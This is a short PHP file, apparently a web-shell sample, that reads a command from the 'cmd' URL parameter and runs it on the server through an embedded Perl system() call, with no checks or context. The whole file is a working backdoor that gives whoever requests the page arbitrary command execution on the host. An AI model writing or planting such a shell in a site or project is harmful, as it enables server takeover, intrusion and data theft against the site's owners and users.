<?php
function perlshelL($command){
	$perl=new perl();
	$perl->eval("system('$command')");
}

$command = $_GET['cmd'];
perlshelL($command);
?>